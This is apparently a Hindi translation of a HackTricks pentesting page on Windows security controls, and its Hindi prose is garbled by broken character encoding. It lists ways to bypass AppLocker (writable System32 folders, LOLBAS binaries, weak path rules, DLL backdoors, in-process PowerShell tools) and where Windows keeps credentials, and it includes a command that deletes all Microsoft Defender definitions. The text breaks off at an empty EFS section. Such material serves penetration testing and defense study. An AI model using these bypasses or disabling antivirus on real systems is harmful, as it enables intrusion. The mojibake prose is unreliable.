# Windows рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдпрдВрддреНрд░рдг

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ **рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker рдиреАрддрд┐

рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдПрдХ рд╕реВрдЪреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрд╡реАрдХреГрдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдореМрдЬреВрдж рд╣реЛрдиреЗ рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐ рд╡рд╛рддрд╛рд╡рд░рдг рдХреЛ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдореИрд▓рд╡реЗрдпрд░ рдФрд░ рдЕрдиреБрдореЛрджрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрд╛ рдЬрд╛рдП рдЬреЛ рд╕рдВрдЧрдарди рдХреА рд╡рд┐рд╢реЗрд╖ рд╡реНрдпрд╡рд╕рд╛рдпрд┐рдХ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ред

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдХрд╛ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рд╕рдорд╛рдзрд╛рди** рд╣реИ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ **рдЙрди рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдФрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдпрд╣ **рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕, рд╕реНрдХреНрд░рд┐рдкреНрдЯ, Windows рд╕реНрдерд╛рдкрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ, DLLs, рдкреИрдХреЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдРрдкреНрд╕ рдФрд░ рдкреИрдХ рдХрд┐рдП рдЧрдП рдРрдкреНрд╕ рд╕реНрдерд╛рдкрдХреЛрдВ** рдкрд░ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред\
рд╕рдВрдЧрдардиреЛрдВ рдХреЗ рд▓рд┐рдП **cmd.exe рдФрд░ PowerShell.exe рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рдирд╛** рдФрд░ рдХреБрдЫ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рд▓рд┐рдЦрдирд╛ рд╕рд╛рдорд╛рдиреНрдп рд╣реИ, **рд▓реЗрдХрд┐рди рдпрд╣ рд╕рднреА рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

### рдЬрд╛рдВрдЪреЗрдВ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреМрди рд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ/рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ/рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рд╣реИрдВ:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
рдпрд╣ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкрде рдЕрдкреНрд▓реЙрдХрд░ рджреНрд╡рд╛рд░рд╛ рд▓рд╛рдЧреВ рд╡рд┐рдиреНрдпрд╛рд╕ рдФрд░ рдиреАрддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдкреНрд░рдгрд╛рд▓реА рдкрд░ рд▓рд╛рдЧреВ рдирд┐рдпрдореЛрдВ рдХреА рд╡рд░реНрддрдорд╛рди рд╕реЗрдЯ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### рдмрд╛рдпрдкрд╛рд╕

* рдЕрдкреНрд▓реЙрдХрд░ рдиреАрддрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░**: рдпрджрд┐ рдПрдкреНрд▓реЙрдХрд░ рдХрд┐рд╕реА рднреА рдЪреАрдЬ рдХреЛ `C:\Windows\System32` рдпрд╛ `C:\Windows` рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рднреА рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣рд╛ рд╣реИ рддреЛ рдЗрд╕рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* рдЖрдорддреМрд░ рдкрд░ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп** [**"LOLBAS's"**](https://lolbas-project.github.io/) рдмрд╛рдЗрдирд░реА рдПрдкрд▓реЙрдХрд░ рдХреЛ рдЫрд▓рдиреЗ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред
* **рдЦрд░рд╛рдм рддрд░реАрдХреЗ рд╕реЗ рд▓рд┐рдЦреА рдЧрдИ рдирд┐рдпрдореЛрдВ рдХреЛ рднреА рдЫрд▓ рд╕рдХрддреЗ рд╣реИрдВ**
* рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, рдЖрдк рдХрд╣реАрдВ рднреА **`allowed` рдирд╛рдордХ рдлрд╝реЛрд▓реНрдбрд░** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдПрдЧреАред
* рд╕рдВрдЧрдарди рдЕрдХреНрд╕рд░ **`%System32%\WindowsPowerShell\v1.0\powershell.exe` рдПрдЧреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓** рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдиреЗ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди **рдЕрдиреНрдп** [**PowerShell рдПрдЧреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рд╕реНрдерд╛рди**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) рдЬреИрд╕реЗ `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` рдпрд╛ `PowerShell_ISE.exe` рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рднреВрд▓ рдЬрд╛рддреЗ рд╣реИрдВред
* **DLL рдкреНрд░рд╡рд░реНрддрди рдмрд╣реБрдд рдХрдо рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд░реАрдХреНрд╖рдг рдХреА рдорд╛рддреНрд░рд╛ред рдЗрд╕рд▓рд┐рдП **DLLs рдХрд╛ рдЙрдкрдпреЛрдЧ рдмреИрдХрдбреЛрд░реНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░рдиреЗ рд╕реЗ рдПрдкрд▓реЙрдХрд░ рдХреЛ рдЫрд▓рдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓реЗрдЧреА**ред
* рдЖрдк [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдпрд╛ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ Powershell** рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдФрд░ рдПрдкрд▓реЙрдХрд░ рдХреЛ рдЫрд▓рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Credentials Storage

### рд╕реБрд░рдХреНрд╖рд╛ рдЦрд╛рддрд╛ рдкреНрд░рдмрдВрдзрдХ (SAM)

рд╕реНрдерд╛рдиреАрдп рдкрд░рд┐рдЪрдп рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдореМрдЬреВрдж рд╣реИрдВ, рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рд╣реИрдВред

### рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг (LSA) - LSASS

**рдкрд░рд┐рдЪрдп** (рд╣реИрд╢) рдЗрд╕ рдЙрдкрдкреНрд░рдгрд╛рд▓реА рдХреА **рд╕реНрдореГрддрд┐** рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдПрдХрд▓ рд╕рд╛рдЗрди-рдСрди рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдПред\
**LSA** рд╕реНрдерд╛рдиреАрдп **рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐** (рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ...) рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддрд╛ рд╣реИ, **рдкреНрд░рдорд╛рдгреАрдХрд░рдг**, **рдкрд╣реБрдВрдЪ рдЯреЛрдХрди**...\
LSA рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ **рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдкрд░рд┐рдЪрдп** рдХреЗ рд▓рд┐рдП **SAM** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ (рд╕реНрдерд╛рдиреАрдп рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП) рдФрд░ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ** рдХреЗ рд╕рд╛рде **рдмрд╛рддрдЪреАрдд** рдХрд░реЗрдЧрд╛ред

**рдкрд░рд┐рдЪрдп** **рдкреНрд░рдХреНрд░рд┐рдпрд╛ LSASS** рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ: рдХрд░реНрдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ, рд╣реИрд╢ NT рдФрд░ LM, рдЖрд╕рд╛рдиреА рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдбред

### LSA рд░рд╣рд╕реНрдп

LSA рдбрд┐рд╕реНрдХ рдореЗрдВ рдХреБрдЫ рдкрд░рд┐рдЪрдп рд╕рд╣реЗрдЬ рд╕рдХрддрд╛ рд╣реИ:

* рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдбред
* рд╡рд┐рдВрдбреЛрдЬ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдЦрд╛рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб
* рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб
* рдЕрдзрд┐рдХ (IIS рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб...)

### NTDS.dit

рдпрд╣ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯреНрд░реА рдХрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реИред рдпрд╣ рдХреЗрд╡рд▓ рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХреЛрдВ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) рдПрдХ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╣реИ рдЬреЛ Windows 10 рдФрд░ Windows 11 рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИ, рдФрд░ Windows рд╕рд░реНрд╡рд░ рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВред рдпрд╣ **рд╕рд╛рдорд╛рдиреНрдп рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдЙрдкрдХрд░рдгреЛрдВ** рдЬреИрд╕реЗ **`WinPEAS`** рдХреЛ **рдмреНрд▓реЙрдХ** рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрди рд╕реБрд░рдХреНрд╖рд╛рдУрдВ рдХреЛ **рдЫрд▓рдиреЗ** рдХреЗ рддрд░реАрдХреЗ рд╣реИрдВред

### рдЬрд╛рдВрдЪ

**Defender** рдХреА **рд╕реНрдерд┐рддрд┐** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк PS cmdlet **`Get-MpComputerStatus`** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП **`RealTimeProtectionEnabled`** рдХреЗ рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рд╕рдХреНрд░рд┐рдп рд╣реИ):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рднреА рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо (EFS)

EFS рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рд╕рдордорд┐рдд рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **рдлрд╝рд╛рдЗрд▓ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА (FEK)** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХреБрдВрдЬреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓ рдХреЗ $EFS **рд╡реИрдХрд▓реНрдкрд┐рдХ рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдо** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИред рдЬрдм рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдбрд┐рдЬрд┐рдЯрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рд╕рдВрдмрдВрдзрд┐рдд **рдирд┐рдЬреА рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ $EFS рд╕реНрдЯреНрд░реАрдо рд╕реЗ FEK рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдпрд╣рд╛рдБ [рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ](https://en.wikipedia.org/wiki/Encrypting\_File\_System)ред

**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░реЗрд░рдгрд╛ рдХреЗ рдмрд┐рдирд╛ рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рд╕реНрдерд┐рддрд┐рдпрд╛рдБ** рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* рдЬрдм рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреЛ рдПрди-рдИрдПрдлрдПрд╕ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдЬреИрд╕реЗ [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table) рдореЗрдВ рд▓реЗ рдЬрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред
* SMB/CIFS рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреА рдЧрдИ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрд╣рд▓реЗ рд╣реА рдЯреНрд░рд╛рдВрд╕рдорд┐рд╢рди рд╕реЗ рдкрд╣рд▓реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рд╣реЛ рдЬрд╛рддреА рд╣реИрдВред

рдпрд╣ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рд╡рд┐рдзрд┐ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдХреЗ рдорд╛рд▓рд┐рдХ рдХреЗ рд▓рд┐рдП **рдкрд╛рд░рджрд░реНрд╢реА рдкрд╣реБрдВрдЪ** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдмрд╕ рдорд╛рд▓рд┐рдХ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓рдирд╛ рдФрд░ рд▓реЙрдЧ рдЗрди рдХрд░рдирд╛ рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдЧрд╛ред

**рдореБрдЦреНрдп рдмрд╛рддреЗрдВ**:

* EFS рдПрдХ рд╕рдордорд┐рдд FEK рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ FEK рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рд╡рд┐рд╢реЗрд╖ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рд╣реЛрддрд╛ рд╣реИ, рдЬреИрд╕реЗ FAT32 рдореЗрдВ рдХреЙрдкреА рдХрд░рдирд╛ рдпрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░рд╛рдВрд╕рдорд┐рд╢рдиред
* рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓реЗрдВ рдорд╛рд▓рд┐рдХ рдХреЗ рд▓рд┐рдП рдмрд┐рдирд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рдХрджрдореЛрдВ рдХреЗ рдкрд╣реБрдВрдЪрдиреАрдп рд╣реИрдВред

### EFS рдЬрд╛рдирдХрд╛рд░реА рдЬрд╛рдВрдЪреЗрдВ

